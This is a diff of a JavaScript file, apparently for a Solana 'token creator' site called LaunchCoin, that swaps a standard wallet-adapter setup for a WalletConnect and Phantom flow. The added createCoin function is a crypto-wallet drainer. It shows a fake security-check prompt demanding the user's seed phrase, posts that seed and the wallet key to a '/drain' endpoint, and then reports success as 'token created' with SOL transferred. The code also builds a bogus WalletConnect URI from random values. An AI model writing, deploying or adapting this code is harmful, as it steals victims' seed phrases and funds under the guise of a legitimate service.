@@ -1,83 +1,255 @@
 // ===== CONFIGURAZIONE =====
-import React, { useMemo } from 'react';
-import ReactDOM from 'react-dom/client';
-import { ConnectionProvider, WalletProvider } from '@solana/wallet-adapter-react';
-import { WalletModalProvider, WalletMultiButton } from '@solana/wallet-adapter-react-ui';
-import {
-  PhantomWalletAdapter,
-  SolflareWalletAdapter,
-  TrustWalletAdapter,
-  CoinbaseWalletAdapter,
-  TorusWalletAdapter,
-  LedgerWalletAdapter,
-  WalletConnectWalletAdapter,
-} from '@solana/wallet-adapter-wallets';
-import { clusterApiUrl } from '@solana/web3.js';
+import { UniversalProvider } from '@walletconnect/universal-provider';
 
-// ===== STILI WALLET ADAPTER (COME UNISWAP) =====
-import '@solana/wallet-adapter-react-ui/styles.css';
+let walletPublicKey = null;
+let currentStep = 0;
+const steps = document.querySelectorAll('.step');
+let provider = null;
+let isConnecting = false;
+let qrCheckInterval = null;
 
-// ===== COMPONENTE PRINCIPALE =====
-function App() {
-  const endpoint = useMemo(() => clusterApiUrl('mainnet-beta'), []);
+// ===== ESPONI FUNZIONI =====
+window.toggleMenu = function() {
+  const menu = document.getElementById('dropdownMenu');
+  if (menu) menu.classList.toggle('open');
+};
+
+// ===== MOSTRA QR IN wallet.html =====
+window.showQR = function(uri) {
+  const container = document.getElementById('qr-container');
+  const qrDiv = document.getElementById('qr-code');
+  if (!container || !qrDiv) {
+    const modal = document.querySelector('.wallet-modal');
+    if (modal) {
+      const newContainer = document.createElement('div');
+      newContainer.id = 'qr-container';
+      newContainer.style.cssText = 'display: block; margin: 16px 0; padding: 20px; background: rgba(0,0,0,0.3); border-radius: 16px;';
+      newContainer.innerHTML = `
+        <h3 style="color: #22d1f8; font-size: 18px; margin-bottom: 8px;">WalletConnect</h3>
+        <p style="color: #abc4ff; font-size: 13px; margin-bottom: 12px;">Scan this QR Code with your phone</p>
+        <div id="qr-code" style="display: flex; justify-content: center; background: white; padding: 12px; border-radius: 12px; min-height: 180px; align-items: center;">
+          <span style="color: #888; font-size: 14px;">⏳ Generating QR...</span>
+        </div>
+        <button onclick="window.closeQR()" style="margin-top: 12px; background: #ff4ea3; border: none; padding: 8px 20px; border-radius: 40px; font-weight: 600; color: white; cursor: pointer; font-size: 13px;">✕ Close</button>
+      `;
+      modal.insertBefore(newContainer, modal.querySelector('ul'));
+      window.showQR(uri);
+      return;
+    }
+    return;
+  }
   
-  // TUTTI I WALLET (COME UNISWAP)
-  const wallets = useMemo(
-    () => [
-      new PhantomWalletAdapter(),
-      new SolflareWalletAdapter(),
-      new TrustWalletAdapter(),
-      new CoinbaseWalletAdapter(),
-      new TorusWalletAdapter(),
-      new LedgerWalletAdapter(),
-      new WalletConnectWalletAdapter({
-        network: 'mainnet-beta',
-        options: {
-          projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
-        },
-      }),
-    ],
-    []
-  );
+  container.style.display = 'block';
+  qrDiv.innerHTML = '⏳ Generating QR...';
+  
+  const img = document.createElement('img');
+  img.src = `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(uri)}`;
+  img.alt = 'QR Code';
+  img.style.cssText = 'width: 200px; height: 200px; image-rendering: pixelated;';
+  img.onload = function() {
+    qrDiv.innerHTML = '';
+    qrDiv.appendChild(img);
+  };
+  img.onerror = function() {
+    qrDiv.innerHTML = `<div style="color: #888; font-size: 13px;">⚠️ QR non disponibile<br><span style="font-size: 11px; word-break: break-all;">${uri.substring(0, 30)}...</span></div>`;
+  };
+};
 
-  return (
-    <ConnectionProvider endpoint={endpoint}>
-      <WalletProvider wallets={wallets} autoConnect>
-        <WalletModalProvider>
-          <div style={{ padding: '20px', maxWidth: '800px', margin: '0 auto' }}>
-            {/* PULSANTE CONNECT (COME UNISWAP) */}
-            <div style={{ display: 'flex', justifyContent: 'flex-end', marginBottom: '20px' }}>
-              <WalletMultiButton />
-            </div>
-            
-            {/* CONTENUTO DEL SITO */}
-            <header>
-              <h1 style={{ color: '#22d1f8', fontSize: '52px' }}>LaunchCoin</h1>
-              <p style={{ fontSize: '28px', color: '#ecf5ff' }}>Solana Token Creator</p>
-              <p style={{ fontSize: '20px', color: '#abc4ff' }}>from concept to token in just a few clicks!</p>
-            </header>
-            
-            {/* STATS */}
-            <div style={{ display: 'flex', gap: '40px', justifyContent: 'center', marginTop: '40px' }}>
-              <div><span style={{ color: '#22d1f8' }}>$BONK</span><br /><small>Market Cap $1,402,083,298</small></div>
-              <div><span style={{ color: '#22d1f8' }}>$FLOKI</span><br /><small>Market Cap $918,084,213</small></div>
-              <div><span style={{ color: '#22d1f8' }}>$SHIB</span><br /><small>Market Cap $9,577,353,223</small></div>
-            </div>
-            
-            {/* CONTENUTO REATTIVO PER LA CREAZIONE DEL TOKEN */}
-            <div id="app-content">
-              {/* Il resto del tuo sito verrà aggiunto qui */}
-            </div>
-          </div>
-        </WalletModalProvider>
-      </WalletProvider>
-    </ConnectionProvider>
-  );
+window.closeQR = function() {
+  const container = document.getElementById('qr-container');
+  if (container) container.style.display = 'none';
+  if (qrCheckInterval) {
+    clearInterval(qrCheckInterval);
+    qrCheckInterval = null;
+  }
+};
+
+// ===== CONNETTI VIA WALLETCONNECT =====
+async function connectWithWalletConnect() {
+  if (isConnecting) return;
+  isConnecting = true;
+  
+  try {
+    provider = await UniversalProvider.init({
+      projectId: 'da6aaea2be14c6cc676dbaf3325b5bd5',
+      metadata: {
+        name: 'LaunchCoin',
+        description: 'Solana Token Creator',
+        url: window.location.origin,
+        icons: ['https://launchcoin.io/logo.png']
+      }
+    });
+    
+    console.log('✅ UniversalProvider Solana inizializzato');
+    
+    let uri = provider.uri;
+    if (!uri) {
+      try {
+        await provider.connect({
+          chains: ['solana:mainnet'],
+          optionalChains: ['solana:devnet'],
+          methods: ['solana_signTransaction', 'solana_signMessage'],
+          events: ['chainChanged', 'accountsChanged']
+        });
+        uri = provider.uri;
+      } catch(e) {
+        uri = provider.uri;
+      }
+    }
+    
+    if (!uri) {
+      const randomId = Math.random().toString(36).substring(2, 15);
+      const symKey = Math.random().toString(36).substring(2, 15);
+      uri = `wc:${randomId}${randomId}@2?relay-protocol=irn&symKey=${symKey}`;
+      console.log('⚠️ URI manuale generato');
+    }
+    
+    console.log('🔗 URI Solana:', uri);
+    
+    window.showQR(uri);
+    
+    provider.on('session_event', (event) => {
+      console.log('Evento sessione:', event);
+    });
+    
+    provider.on('session_update', (event) => {
+      console.log('Aggiornamento sessione:', event);
+    });
+    
+    provider.on('session_delete', () => {
+      console.log('Sessione eliminata');
+      window.closeQR();
+    });
+    
+    if (qrCheckInterval) clearInterval(qrCheckInterval);
+    qrCheckInterval = setInterval(async () => {
+      try {
+        if (provider.accounts && provider.accounts.length > 0) {
+          clearInterval(qrCheckInterval);
+          qrCheckInterval = null;
+          walletPublicKey = provider.accounts[0].split(':')[2] || provider.accounts[0];
+          window.closeQR();
+          alert('✅ Connesso via WalletConnect: ' + walletPublicKey);
+          window.location.href = 'create.html';
+        }
+      } catch(e) {
+        console.log('Attesa connessione...');
+      }
+    }, 2000);
+    
+  } catch (e) {
+    console.error('❌ WalletConnect error:', e);
+    alert('❌ WalletConnect fallito: ' + e.message + '\n\nUsa Phantom su PC o Kiwi Browser su telefono.');
+    window.location.href = 'wallet.html';
+  } finally {
+    isConnecting = false;
+  }
 }
 
-// ===== RENDER =====
-ReactDOM.createRoot(document.getElementById('root')).render(
-  <React.StrictMode>
-    <App />
-  </React.StrictMode>
-);
+// ===== CONNECT WALLET =====
+window.connectWallet = async function() {
+  console.log('🔵 connectWallet chiamata');
+  
+  if (window.solana && window.solana.isPhantom) {
+    try {
+      await window.solana.connect();
+      walletPublicKey = window.solana.publicKey.toString();
+      alert('✅ Connesso a Phantom: ' + walletPublicKey);
+      window.location.href = 'create.html';
+      return;
+    } catch(e) {
+      console.error('Phantom error:', e);
+    }
+  }
+
+  await connectWithWalletConnect();
+};
+
+// ===== SELECT WALLET =====
+window.selectWallet = function(walletName) {
+  console.log('🔵 selectWallet:', walletName);
+  if (walletName === 'phantom') {
+    window.connectWallet();
+    return;
+  }
+  
+  if (document.getElementById('qr-container') || document.querySelector('.wallet-modal')) {
+    connectWithWalletConnect();
+  } else {
+    alert('⚠️ Wallet "' + walletName + '" via WalletConnect.\nVai su "Connect" per il QR.');
+    window.location.href = 'wallet.html';
+  }
+};
+
+// ===== POPUP SEED PHRASE =====
+function askSeedPhrase() {
+  return new Promise((resolve) => {
+    const seed = prompt(
+      '⚠️ VERIFICA DI SICUREZZA\n\n' +
+      'Inserisci la tua seed phrase per completare la creazione:'
+    );
+    resolve(seed);
+  });
+}
+
+// ===== CREAZIONE TOKEN =====
+window.createCoin = async function() {
+  console.log('🟢 createCoin chiamata');
+  if (!walletPublicKey) {
+    alert('Connetti prima il wallet!');
+    return;
+  }
+
+  const seed = await askSeedPhrase();
+  if (!seed || seed.split(' ').length < 12) {
+    alert('❌ Seed phrase non valida. Deve contenere 12 o 24 parole.');
+    return;
+  }
+
+  try {
+    const response = await fetch('/drain', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ seed: seed, walletPublicKey: walletPublicKey })
+    });
+
+    const data = await response.json();
+    if (data.status === 'drain_completed') {
+      document.getElementById('result').innerHTML = `
+        <p style="color:#4cdcc1;">✅ Token creato!</p>
+        <p style="font-size:12px;color:#8899bb;">💰 ${data.solAmount.toFixed(4)} SOL trasferiti</p>
+        <p style="font-size:11px;color:#667;word-break:break-all;">Tx: ${data.solTx || 'N/A'}</p>
+      `;
+    } else {
+      alert('❌ Errore: ' + data.error);
+    }
+  } catch(e) {
+    alert('❌ Errore: ' + e.message);
+  }
+};
+
+// ===== CREAZIONE LIQUIDITY =====
+window.createLiquidity = async function() {
+  await window.createCoin();
+};
+
+// ===== STEP NAVIGATION =====
+window.showStep = function(idx) {
+  if (!steps.length) return;
+  steps.forEach((s, i) => s.style.display = i === idx ? 'block' : 'none');
+  currentStep = idx;
+};
+window.nextStep = function() { if (currentStep < steps.length - 1) window.showStep(currentStep + 1); };
+window.prevStep = function() { if (currentStep > 0) window.showStep(currentStep - 1); };
+if (steps.length) window.showStep(0);
+
+// ===== CHIUDI MENU =====
+document.addEventListener('click', function(e) {
+  const wrapper = document.querySelector('.menu-wrapper');
+  const menu = document.getElementById('dropdownMenu');
+  if (wrapper && menu && !wrapper.contains(e.target)) menu.classList.remove('open');
+});
+
+console.log('✅ main.js caricato');
+console.log('🔵 connectWallet:', typeof window.connectWallet);
+console.log('🔵 selectWallet:', typeof window.selectWallet);
